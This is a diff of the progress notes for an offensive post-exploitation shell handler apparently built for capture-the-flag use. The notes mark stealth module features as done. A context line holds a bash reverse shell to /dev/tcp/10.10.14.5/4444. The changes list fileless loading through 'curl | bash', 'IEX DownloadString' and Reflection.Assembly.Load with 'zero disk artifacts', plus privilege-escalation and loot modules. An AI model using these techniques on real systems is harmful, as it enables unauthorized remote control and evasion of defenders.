@@ -201,24 +201,23 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Platform auto-detection based on prompt patterns (`PS C:\` for Windows)
   - Known limitation: Prompt may briefly disappear when navigating history
 
-### 📋 TODO (Phase 5 - Module Optimization & Polish) - See TODO.md for details
+### ✅ Completed (Phase 5 - Module Optimization & Polish)
 
-**Next Up: Module Optimization**
-- [ ] **Optimize run modules with binbag** - Use HTTP for faster module downloads
-- [ ] **Module chunking support** - Fallback to b64 chunks when binbag disabled
-- [ ] **Simplify execution modes** - Binbag solves speed issue, may not need stealth/speed toggle
-- [ ] **Add `run bin` module** - Generic disk+cleanup for any binary/executable
-- [ ] **Implement .NET in-memory execution** - Load assemblies via `[Reflection.Assembly]::Load($bytes)`
-  - Zero disk artifacts for .NET tools (SharpUp, Rubeus, Seatbelt, etc.)
-  - Download via HTTP, load bytes directly into memory
-  - Execute with `$assembly.EntryPoint.Invoke($null, @(,$args))`
-  - See: .NET In-Memory Execution section below
+**Latest Update (2026-03-12):** Module HTTP optimization, .NET/PS1 HTTP, SIGWINCH, session logging all complete!
 
-**Polish & Testing**
-- [ ] **Fix Windows whoami detection** - Currently shows "unknown", should extract from command output
-- [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing
-- [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
-- [ ] **Session Logging** - Automatic logging of all session I/O to `logs/` directory
+**Module Optimization:**
+- [x] **Optimize run modules with binbag** - `curl | bash` for Linux, `IEX DownloadString` for PS1, `DownloadData` for .NET
+- [x] **Module b64 fallback** - All modules gracefully fall back to b64 variable upload when binbag disabled
+- [x] **Simplified execution modes** - stealth = in-memory (curl|bash, Reflection.Load), speed = disk (SmartUpload → shred)
+- [x] **Add `run bin` module** - Generic disk+cleanup for any binary/executable from URL or binbag
+- [x] **.NET in-memory via HTTP** - `DownloadData` + `Reflection.Assembly.Load` - single HTTP request, zero disk
+- [x] **PowerShell in-memory via HTTP** - `IEX DownloadString` - single HTTP request, zero disk
+- [x] **Fix Windows whoami detection** - Two-phase detection: platform from prompt → platform-specific commands
+- [x] **SIGWINCH handler** - Dynamic terminal resize when user resizes window
+- [x] **Session Logging** - Automatic I/O logging to `~/.gummy/YYYY_MM_DD/IP_user_hostname/logs/session_N.log`
+
+**Remaining Polish & Testing**
+- [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing with HTTP mode
 - [ ] **Windows Modules** - WinPEAS, PowerUp, PrivescCheck integration
 - [ ] **Additional Linux Modules** - See TODO.md for suggestions
 - [ ] Port forwarding (local/remote) - NOT PRIORITY (use ligolo)
@@ -932,10 +931,10 @@ Use `run bin` module (disk + cleanup):
 
 ## Progress Tracking
 
-**Last updated:** 2025-10-17
-**Current focus:** Windows PowerShell support complete! 🎉
-**Next milestone:** Fix whoami detection for Windows, test Windows modules
-**Lines of code:** ~4,400 LOC (3,800 core + 510 UI + 110 modules)
+**Last updated:** 2026-03-12
+**Current focus:** Phase 5 complete! Module HTTP optimization, SIGWINCH, session logging
+**Next milestone:** Test Windows HTTP modules on real targets
+**Lines of code:** ~6,600 LOC
 **Modules:** 13 files in `internal/` (flat structure) + 1 `main.go`
 **Status:** Production-ready for CTF use with both Linux and Windows! ✅
 
@@ -948,9 +947,11 @@ Use `run bin` module (disk + cleanup):
 - ✅ **Module System** - Extensible with 6 Linux modules (peas, lse, loot, pspy, privesc, sh)
 - ✅ **Stealth Operations** - In-memory script execution (bash, ps1, net, py), zero disk artifacts
 - ✅ **Windows PowerShell** - Full interactive shell support with line editing and history
-- ⏳ **Windows whoami detection** - Platform detected correctly, but user@host shows "unknown"
-- ⏳ **Windows modules testing** - Need to test ps1, net, py modules on actual Windows targets
-- ⏳ **Session logging** - Directory structure ready, logging not implemented
+- ✅ **Windows whoami detection** - Two-phase platform detection + platform-specific commands with fallback retry
+- ⏳ **Windows HTTP modules testing** - Need to test ps1, net, py modules with HTTP mode on actual Windows targets
+- ✅ **Session logging** - Automatic I/O logging to logs/ directory with session headers
+- ✅ **SIGWINCH handler** - Dynamic terminal resize during PTY sessions
+- ✅ **Module HTTP optimization** - curl|bash, IEX DownloadString, DownloadData + Reflection.Load
 
 ### Command Reference
 ```
@@ -976,6 +977,7 @@ run lse [-l1|-l2]            - Run Linux Smart Enumeration (💾, default: -l1)
 run loot                     - Run ezpz post-exploitation script (💾)
 run pspy                     - Monitor processes without root (🧹, 5min timeout)
 run privesc                  - Upload multiple privesc scripts (💿, platform-aware)
+run bin <url|file> [args]    - Run arbitrary binary (🧹, disk + cleanup)
 run sh <url> [args]          - Run arbitrary shell script from URL (💾)
 
 # Utility
@@ -987,5 +989,5 @@ exit, quit                   - Exit gummy (with confirmation)
 ### Known Limitations
 - Terminal resize (SIGWINCH) not yet implemented - size fixed at connection time
 - No port forwarding yet (planned for Phase 4)
-- Session logging to files not implemented
+- Session logging captures remote output only (not local input in PTY mode)
 - Remote path completion in readline is placeholder only
